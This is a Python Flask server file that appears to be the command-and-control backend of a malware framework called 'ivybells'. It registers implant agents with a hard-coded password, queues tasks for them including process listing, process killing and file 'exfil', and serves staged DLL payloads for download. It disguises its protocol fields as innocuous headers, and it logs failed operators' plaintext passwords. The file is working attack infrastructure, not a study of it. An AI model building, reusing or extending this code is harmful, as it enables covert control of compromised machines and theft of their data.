import hashlib
import os
from flask import send_file
import io
from flask_restful import Resource, reqparse
from ivybells import db
try:
    from ivybells.models import Agent, Operator, Task, Module
except Exception as e:
    print(e)
    try:
        from ivybells.models import Agent, Task, Module
        from run import Operator
    except Exception:
        pass
from datetime import datetime
from hashlib import md5
import json
import uuid
import random
import sys
########################SUPER USER INITIALIZATION#################################
def create_defaultUser():
    super_user = sys.argv[1]
    super_user_password = str(sys.argv[2])

    super = Operator(name=super_user, password=hashlib.sha256(super_user_password.encode('utf-8')).hexdigest(), privs="super")
    db.session.add(super)
    db.session.commit()
########################SUPER USER INITIALIZATION#################################



################################OPERATOR FUNCTIONALITY############################
def login(username, password):
    hashed = hashlib.sha256(password.encode('utf-8')).hexdigest()
    user = None
    user = Operator.query.filter_by(name=username).filter_by(password=hashed).first()
    if user:
        return user
    else:
        return None



class OperatorEndpoint(Resource):
    parser = reqparse.RequestParser()
    parser.add_argument('username',
                       type=str,
                       required=False,
                       help='This field cannot be blank.'
                       )
    parser.add_argument('password',
                       type=str,
                       required=False,
                       help='This field cannot be blank.'
                       )
    parser.add_argument('function',
                       type=str,
                       required=False,
                       help='This field cannot be blank.'
                       )
    parser.add_argument('arg',
                        type=str,
                        required=False,
                        help='This field cannot be blank.'
                        )
    parser.add_argument('uuid',
                        type=str,
                        required=False,
                        help='This field cannot be blank.'
                        )
    parser.add_argument('tasknumber',
                        type=str,
                        required=False,
                        help='This field cannot be blank.'
                        )
    parser.add_argument('dll',
                        type=str,
                        required=False,
                        help='This field cannot be blank.'
                        )
    parser.add_argument('module-name',
                        type=str,
                        required=False,
                        help='This field cannot be blank.'
                        )
    parser.add_argument('num',
                        type=str,
                        required=False,
                        help='This field cannot be blank.'
                        )
    def get(self):
        data = OperatorEndpoint.parser.parse_args()
        user = login(username=data["username"], password=str(data["password"]))
        if user:
            func = data['function']
            if func == "check-task":
                task = Task.query.filter_by(id=data['tasknumber']).first()
                if task:
                   task_data = task.data


                   if task.code == 3: # for special formatting when displaying processes and PIDs
                       if task_data:
                           #print(task_data)
                           task_data = {}
                           temp_list = task.data.split("\n")
                          # print(temp_list)
                           i = 0
                           for t in temp_list:
                               try:
                                   colon_split = t.split(":")
                                   task_data[str(i)] = [colon_split[0], colon_split[1]]
                               except Exception:
                                   pass
                               i += 1
                           return {"status": task.result, "data": json.dumps(task_data)}
                       else:
                            return {"status": task.result, "data": ""}
                   else:
                        return {"status": task.result, "data": task_data}
                else:
                    return "task not found", 404
            elif func == "list-agents":
               agents = Agent.query.all()
               retlist = []
               for a in agents:
                    retlist.append([a.hostname, a.agentUUID, a.modules])
               with open(f'ivybells\\Log\\{str(datetime.today().month) + "~" + str(datetime.today().day) + "~" + str(datetime.today().year)}','a') as f:
                   f.write(f"[{user.name}] list-agents")
               return {"agents": retlist}, 200

            elif func == "list-modules":
                ret = []
                modules = Module.query.all()
                for mod in modules:
                    ret.append([mod.name, mod.filename])
                with open(f'ivybells\\Log\\{str(datetime.today().month) + "~" + str(datetime.today().day) + "~" + str(datetime.today().year)}', 'a') as f:
                    f.write(f"[{user.name}] list-modules")
                return {"modules": ret}, 200

            elif func == "list-tasks":
                ret = []
                tasks = Task.query.all()
                for t in tasks:
                    ret.append([t.command + " " + t.args, t.result, t.author, t.agentUUID, t.time])
                with open(f'ivybells\\Log\\{str(datetime.today().month) + "~" + str(datetime.today().day) + "~" + str(datetime.today().year)}', 'a') as f:
                    f.write(f"[{user.name}] list-tasks")
                return {"tasks": ret}, 200

        else:
           return "error", 404



    def post(self):
        data = OperatorEndpoint.parser.parse_args()
        print(data)
        user = login(username=data["username"], password=str(data["password"]))
        if user:
            func = data["function"]
            print(func)
            # BASICALLY A SWITCH STATEMENT BETWEEN ALL FUNCTIONS TO ADD THE FUNCTION CODES TO THE TASK
            if func == "pd": # Print directory command to agent --> pd <directory>
                try:
                    arg = data['arg']
                except Exception:
                    arg = None
                task = Task(agentUUID=data['uuid'], command=data["function"], args=arg, id=str(uuid.uuid4()), code=1, author=data["username"])
                db.session.add(task)
                db.session.commit()
                return {"tasknumber": task.id}, 200

            elif func == "users":
                task = Task(agentUUID=data['uuid'], command=data["function"], args="", id=str(uuid.uuid4()), code=2, author=data["username"])
                db.session.add(task)
                db.session.commit()
                return {"tasknumber": task.id}, 200


            elif func == "proc":
                task = Task(agentUUID=data['uuid'], command=data["function"], args="", id=str(uuid.uuid4()), code=3, author=data["username"])
                db.session.add(task)
                db.session.commit()
                return {"tasknumber": task.id}, 200

            elif func == "kill":
                try:
                    arg = data['arg']
                except Exception:
                    arg = None
                task = Task(agentUUID=data['uuid'], command=data["function"], args=arg, id=str(uuid.uuid4()), code=4, author=data["username"])
                db.session.add(task)
                db.session.commit()
                return {"tasknumber": task.id}, 200

            elif func == "exfil":
                try:
                    arg = data['arg']
                except Exception:
                    arg = None
                task = Task(agentUUID=data['uuid'], command=data["function"], args=arg, id=str(uuid.uuid4()), code=5, author=data["username"])
                db.session.add(task)
                db.session.commit()
                return {"tasknumber": task.id}, 200

            elif func == "load-module":
                try:
                    arg = data["arg"]
                except Exception:
                    arg = None
                module_loaded = False
                modules = Module.query.all()
                found_module = None
                for mod in modules:
                    if mod.name == arg:
                        module_loaded = True
                        found_module = mod
                if module_loaded:
                    agent = Agent.query.filter_by(agentUUID=data['uuid']).first()
                    loaded_mods = agent.modules.split(":")
                    for mod in loaded_mods:
                        if mod == found_module.name:
                            return {"error", "agent has already loaded module"}, 404
                    task = Task(agentUUID=data['uuid'], command=data["function"], args=found_module.uuid, id=str(uuid.uuid4()), code=6, author=data["username"])
                    db.session.add(task)
                    db.session.commit()
                    return {"tasknumber": task.id}, 200
                else:
                    return {"error": "module not loaded"}, 404

            elif func == "module-function":
                try:
                    num = data["num"]
                    arg = data["arg"]
                    modName = data["module-name"]
                    agent = Agent.query.filter_by(agentUUID=data["uuid"]).first()
                    if agent:
                        loaded_mods = agent.modules.split(":")
                        modNumber = 0
                        for mod in loaded_mods:
                            if mod == "":
                                continue
                            print(f"mod-->{mod}")
                            if mod == modName:
                                break
                            modNumber += 1
                            print(f"modNumber: {modNumber}")
                        task = Task(agentUUID=data['uuid'], command=f"{modNumber}/{num}", args=f"{arg}{modNumber}{num}", id=str(uuid.uuid4()), code=7, author=data["username"])
                        db.session.add(task)
                        db.session.commit()
                        return {"tasknumber": task.id}
                except Exception as e:
                    print(e)
                    return "error", 404

            elif func == "register-module":
                try:
                    modName = data["module-name"]
                    dllName = data["dll"]
                except Exception:
                    return "error", 404

                module = Module(name=modName, filename=dllName, uuid=str(uuid.uuid4()))
                db.session.add(module)
                try:
                    db.session.commit()
                    return {"status": "success"}, 200
                except Exception:
                    return {"status": "exists"}, 201




            else:
                return "invalid command", 404


        else:
            return "error", 404





class LoginCheck(Resource):
    parser = reqparse.RequestParser()
    parser.add_argument('username',
                        type=str,
                        required=False,
                        help='This field cannot be blank.'
                        )
    parser.add_argument('password',
                        type=str,
                        required=False,
                        help='This field cannot be blank.'
                        )
    def post(self):
        try:
            data = LoginCheck.parser.parse_args()
        except Exception as e:
            print(e)

        user = login(username=data["username"], password=str(data["password"]))
        if user:
            with open(f'ivybells\\Log\\{str(datetime.today().month) + "~" + str(datetime.today().day) + "~" + str(datetime.today().year)}', 'a') as f:
                f.write(f"[SIGN-IN SUCCESS]\t{data['username']}\n")
            return {"status": "success", "privs": user.privs}, 200
        else:
            with open(f'ivybells\\Log\\{str(datetime.today().month) + "~" + str(datetime.today().day) + "~" + str(datetime.today().year)}', 'a') as f:
                f.write(f"[SIGN-IN FAILURE]\tUSER:{data['username']} PASSWORD:{data['password']}\n")
            return "error", 404


################################OPERATOR FUNCTIONALITY############################

class RegisterAgent(Resource):
    parser = reqparse.RequestParser()
    parser.add_argument('password',
                        type=str,
                        required=False,
                        help='This field cannot be blank.'
                        )
    parser.add_argument('host',
                        type=str,
                        required=False,
                        help='This field cannot be blank.'
                        )

    def post(self):
        data = RegisterAgent.parser.parse_args()
        if (data['password'] == 'ivybells'):
            agent = Agent(time=datetime.utcnow(), hostname=data['host'], agentUUID=str(uuid.uuid4()), password=random.randint(1, 250000), modifier=random.randint(1, 4))
            with open(f'ivybells\\Log\\{str(datetime.today().month) + "~" + str(datetime.today().day) + "~" + str(datetime.today().year)}', 'a') as f:
                f.write(agent.toString())
            db.session.add(agent)
            db.session.commit()
            print(agent.agentUUID)
            # x-forward=return code, queue-number = agent password, hop-count = password modifier
            return {"x-forward": 10, "queue-number": str(agent.password), "hop-count": int(agent.modifier), "id": str(agent.agentUUID)}, 200
        else:
            return {"x-forward-denied": 90}, 502
    def get(self):
        return {"x-forward-denied": 90}, 502
    def put(self):
        return {"x-forward-denied": 90}, 502


class RetrievePayload(Resource):
    parser = reqparse.RequestParser()
    parser.add_argument('uuid',
                        type=str,
                        required=False,
                        help='This field cannot be blank.'
                        )
    parser.add_argument('mod',
                        type=str,
                        required=False,
                        help='This field cannot be blank.'
                        )

    def get(self):
        data = RetrievePayload.parser.parse_args()
        agent = Agent.query.filter_by(agentUUID=data["uuid"]).first()
        module = Module.query.filter_by(uuid=data["mod"]).first()
        with open(f'ivybells\\Log\\{str(datetime.today().month) + "~" + str(datetime.today().day) + "~" + str(datetime.today().year)}','a') as f:
            f.write(f"Payload {module.name} retrieved by {agent.hostname}({agent.agentUUID})\n")

        print(f"PAYLOAD(ivybells/payloads/{module.filename}) BEING SENT TO {agent.hostname}")
        with open(f"ivybells\\payloads\\{module.filename}", 'rb') as f:
            return send_file(io.BytesIO(f.read()), download_name="stage1.dll")


class Init(Resource):
    parser = reqparse.RequestParser()
    parser.add_argument('api',
                        type=str,
                        required=False,
                        help='This field cannot be blank.'
                        )
    def get(self):
        data = Init.parser.parse_args()
        print(f"GOT-->{data['api']}")
        if data['api'] == "ivybells":
            with open(f"ivybells\\payloads\\Stage0.dll", 'rb') as f:
                return send_file(io.BytesIO(f.read()), download_name="00000.dll")
        else:
            return "error not found", 404



class RetrieveTasks(Resource):
    parser = reqparse.RequestParser()
    parser.add_argument('uuid',
                        type=str,
                        required=False,
                        help='This field cannot be blank.'
                        )
    parser.add_argument('id',
                        type=str,
                        required=False,
                        help='This field cannot be blank.'
                        )
    parser.add_argument('data',
                        type=str,
                        required=False,
                        help='This field cannot be blank.'
                        )
    parser.add_argument('status',
                        type=str,
                        required=False,
                        help='This field cannot be blank.'
                        )
    def get(self):
        data = RetrieveTasks.parser.parse_args()
        print(data)
        agent_uuid = data['uuid']
        task = Task.query.filter_by(agentUUID=agent_uuid).filter_by(result="PENDING").first()
        if task:
            # x-forward will be stored as taskNumber in the Task struct on the implant
            return {"x-forward": task.code, "hop-count": task.args, "id": task.id}, 200
        else:
            return "none", 404
    def post(self):
        data = RetrieveTasks.parser.parse_args()
        agent = None
        agentUUID = data['uuid']
        taskNumber = data['id']
        ret_data = data['data']
        status = data['status']
        task = Task.query.filter_by(id=taskNumber).first()
        # update
        task.result = status
        task.data = ret_data
        if task.command == "load-module" and ret_data == "load success":
            print("agent")
            agent = Agent.query.filter_by(agentUUID=agentUUID).first()
            module = Module.query.filter_by(uuid=task.args).first()
            agent.modules += f":{module.name}"
        db.session.commit()
        return {"x-forward": 10}, 200 # use this as the received code













